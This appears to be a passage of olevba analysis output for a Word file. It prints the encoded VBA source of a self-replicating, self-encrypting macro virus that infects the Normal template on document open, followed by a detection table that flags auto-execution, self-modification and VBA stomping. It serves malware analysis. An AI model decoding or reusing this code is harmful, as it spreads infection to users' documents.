' 	QuoteRem 0x0000 0x0053 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢    ¢ « .å÷.áíå « ¢¨-©¢º ,éîå ½ ,éîå « ±"
' Line #97:
' 	QuoteRem 0x0000 0x00CC "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢    ¢ « ¢#-®$åìåôå,éîåó ,éî"åç¬ #-®#ïõîô/æ,éîåó ­ ,éî"åçº #-®)îóåòô,éîåó ,éî"åç¬ ##º    !ãôéöå$ïãõíåîô®3áöå!ó &éìå.áíåº½!ãôéöå$ïãõíåîô®&õìì.áíå¢º ,éîå ½ ,éîå « ±"
' Line #98:
' 	QuoteRem 0x0000 0x0044 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢%îä 3õâ¢º ,éîå ½ ,éîå « ±"
' Line #99:
' 	QuoteRem 0x0000 0x005E "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢3õâ ¢ « .å÷.áíå « ¢¨- !ó 6áòéáîô©¢º ,éîå ½ ,éîå « ±"
' Line #100:
' 	QuoteRem 0x0000 0x0035 "        $ï 7èéìå -¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±© ¼¾ ¢¢"
' Line #101:
' 	QuoteRem 0x0000 0x005D "            -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ -¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±©º ,éîå ½ ,éîå « ±"
' Line #102:
' 	QuoteRem 0x0000 0x000C "        ,ïïð"
' Line #103:
' 	QuoteRem 0x0000 0x003B "    %ìóå)æ )î3ôò¨-¨±©®#ïäå-ïäõìå®,éîåó¨±¬ ±©¬ ¢#ìïóå¢© 4èåî"
' Line #104:
' 	QuoteRem 0x0000 0x0043 "        -¨²©®#ïäå-ïäõìå®!ää&òïí3ôòéîç ¢0òéöáôå 3õâ $ïãõíåîô?/ðåî¨©¢"
' Line #105:
' 	QuoteRem 0x0000 0x0041 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ²¬ ¢    /î %òòïò 2åóõíå .åøô¢"
' Line #106:
' 	QuoteRem 0x0000 0x0052 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ³¬ ¢    $éí -¨²© !ó 6áòéáîôº $éí ,¨¸© !ó "ùôå¢"
' Line #107:
' 	QuoteRem 0x0000 0x0065 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ´¬ ¢    3åô -¨±© ½ !ãôéöå$ïãõíåîô®6"0òïêåãô®6"#ïíðïîåîôó®)ôåí¨±©¢"
' Line #108:
' 	QuoteRem 0x0000 0x0065 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó µ¬ ¢    3åô -¨²© ½ .ïòíáì4åíðìáôå®6"0òïêåãô®6"#ïíðïîåîôó®)ôåí¨±©¢"
' Line #109:
' 	QuoteRem 0x0000 0x0010 "        ,éîå ½ ¶"
' Line #110:
' 	QuoteRem 0x0000 0x0048 "        $ï 7èéìå )î3ôò¨-¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±©¬ ¢$åìåôå¢© ½ &áìóå"
' Line #111:
' 	QuoteRem 0x0000 0x005D "            -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ -¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±©º ,éîå ½ ,éîå « ±"
' Line #112:
' 	QuoteRem 0x0000 0x000C "        ,ïïð"
' Line #113:
' 	QuoteRem 0x0000 0x0056 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢    #-®$åìåôå,éîåó ,éî"åç¢º ,éîå ½ ,éîå « ±"
' Line #114:
' 	QuoteRem 0x0000 0x0053 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢    ¢ « .å÷.áíå « ¢¨-©¢º ,éîå ½ ,éîå « ±"
' Line #115:
' 	QuoteRem 0x0000 0x00CC "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢    ¢ « ¢#-®$åìåôå,éîåó ,éî"åç¬ #-®#ïõîô/æ,éîåó ­ ,éî"åçº #-®)îóåòô,éîåó ,éî"åç¬ ##º    !ãôéöå$ïãõíåîô®3áöå!ó &éìå.áíåº½!ãôéöå$ïãõíåîô®&õìì.áíå¢º ,éîå ½ ,éîå « ±"
' Line #116:
' 	QuoteRem 0x0000 0x0044 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢%îä 3õâ¢º ,éîå ½ ,éîå « ±"
' Line #117:
' 	QuoteRem 0x0000 0x005E "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢3õâ ¢ « .å÷.áíå « ¢¨- !ó 6áòéáîô©¢º ,éîå ½ ,éîå « ±"
' Line #118:
' 	QuoteRem 0x0000 0x0035 "        $ï 7èéìå -¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±© ¼¾ ¢¢"
' Line #119:
' 	QuoteRem 0x0000 0x005D "            -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ -¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±©º ,éîå ½ ,éîå « ±"
' Line #120:
' 	QuoteRem 0x0000 0x000C "        ,ïïð"
' Line #121:
' 	QuoteRem 0x0000 0x000A "    %îä )æ"
' Line #122:
' 	QuoteRem 0x0000 0x0007 "#2904?º"
' Line #123:
' 	QuoteRem 0x0000 0x0014 "    $éí ,¨¸© !ó "ùôå"
' Line #124:
' 	QuoteRem 0x0000 0x0021 "    )æ ).& ½ &áìóå 4èåî 'ï4ï %.$?"
' Line #125:
' 	QuoteRem 0x0000 0x0013 "    2áîäïíéúå 4éíåò"
' Line #126:
' 	QuoteRem 0x0000 0x000C "    ,¨±© ½ ±"
' Line #127:
' 	QuoteRem 0x0000 0x0012 "    &ïò ) ½ ² 4ï ¸"
' Line #128:
' 	QuoteRem 0x0000 0x0015 "        &ïõîä ½ &áìóå"
' Line #129:
' 	QuoteRem 0x0000 0x0010 "        )ôåò ½ °"
' Line #130:
' 	QuoteRem 0x0000 0x001E "        $ï 7èéìå &ïõîä ½ &áìóå"
' Line #131:
' 	QuoteRem 0x0000 0x001F "                )ôåò ½ )ôåò « ±"
' Line #132:
' 	QuoteRem 0x0000 0x0026 "                î ½ )îô¨¨¸ ª 2îä© « ±©"
' Line #133:
' 	QuoteRem 0x0000 0x002B "                )æ î ¼¾ ) /ò )ôåò ¾ ±µ 4èåî"
' Line #134:
' 	QuoteRem 0x0000 0x0019 "                    ê ½ ±"
' Line #135:
' 	QuoteRem 0x0000 0x0032 "                    $ï 7èéìå ¨,¨ê© ¼¾ î© !îä ê ¼ )"
' Line #136:
' 	QuoteRem 0x0000 0x0021 "                        ê ½ ê « ±"
' Line #137:
' 	QuoteRem 0x0000 0x0018 "                    ,ïïð"
' Line #138:
' 	QuoteRem 0x0000 0x0021 "                    )æ ê ½ ) 4èåî"
' Line #139:
' 	QuoteRem 0x0000 0x0024 "                        &ïõîä ½ 4òõå"
' Line #140:
' 	QuoteRem 0x0000 0x0020 "                        ,¨)© ½ î"
' Line #141:
' 	QuoteRem 0x0000 0x001A "                    %îä )æ"
' Line #142:
' 	QuoteRem 0x0000 0x0016 "                %îä )æ"
' Line #143:
' 	QuoteRem 0x0000 0x000C "        ,ïïð"
' Line #144:
' 	QuoteRem 0x0000 0x0008 "    .åøô"
' Line #145:
' 	QuoteRem 0x0000 0x000E "    ê ½ ,éî"åç"
' Line #146:
' 	QuoteRem 0x0000 0x0025 "    $éí #ùðèåò !ó 3ôòéîçº #ùðèåò ½ ¢¢"
' Line #147:
' 	QuoteRem 0x0000 0x0049 "    $ï 7èéìå )î3ôò¨-¨²©®#ïäå-ïäõìå®,éîåó¨ê¬ ±©¬ ¢º %îä ¢ « ¢3õâ¢© ½ &áìóå"
' Line #148:
' 	QuoteRem 0x0000 0x002B "        ,éîåê ½ -¨²©®#ïäå-ïäõìå®,éîåó¨ê¬ ±©"
' Line #149:
' 	QuoteRem 0x0000 0x0016 "        #ùð,éîåê ½ ¢§¢"
' Line #150:
' 	QuoteRem 0x0000 0x001F "        &ïò ë ½ ± 4ï ,åî¨,éîåê©"
' Line #151:
' 	QuoteRem 0x0000 0x0025 "            ï ½ !óã¨-éä¨,éîåê¬ ë¬ ±©©"
' Line #152:
' 	QuoteRem 0x0000 0x001F "            ) ½ )îô¨ï ¯ ³²© « ±"
' Line #153:
' 	QuoteRem 0x0000 0x0023 "            # ½ ³² ª ¨,¨)© ­ )© « ï"
' Line #154:
' 	QuoteRem 0x0000 0x0028 "            #ùð,éîåê ½ #ùð,éîåê « #èò¨#©"
' Line #155:
' 	QuoteRem 0x0000 0x000C "        .åøô"
' Line #156:
' 	QuoteRem 0x0000 0x002C "        #ùðèåò ½ #ùðèåò « #ùð,éîåê « #èò¨±³©"
' Line #157:
' 	QuoteRem 0x0000 0x0011 "        ê ½ ê « ±"
' Line #158:
' 	QuoteRem 0x0000 0x0008 "    ,ïïð"
' Line #159:
' 	QuoteRem 0x0000 0x000B "    +å ½ ¢¢"
' Line #160:
' 	QuoteRem 0x0000 0x0012 "    &ïò ) ½ ² 4ï ¸"
' Line #161:
' 	QuoteRem 0x0000 0x001E "        +å ½ +å « &ïòíáô¨,¨)©©"
' Line #162:
' 	QuoteRem 0x0000 0x0008 "    .åøô"
' Line #163:
' 	QuoteRem 0x0000 0x0030 "    -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éî"åç¬ ¢§¢ « +å"
' Line #164:
' 	QuoteRem 0x0000 0x0051 "    -¨²©®#ïäå-ïäõìå®$åìåôå,éîåó ,éî"åç « ±¬ -¨²©®#ïäå-ïäõìå®#ïõîô/æ,éîåó ­ ,éî"åç"
' Line #165:
' 	QuoteRem 0x0000 0x0045 "    -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éî"åç « ±¬ #ùðèåò « ¢º %îä¢ « ¢ 3õâ¢"
' Line #166:
' 	QuoteRem 0x0000 0x0005 "%.$?º"
' Line #167:
' 	BoS 0x0000 
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

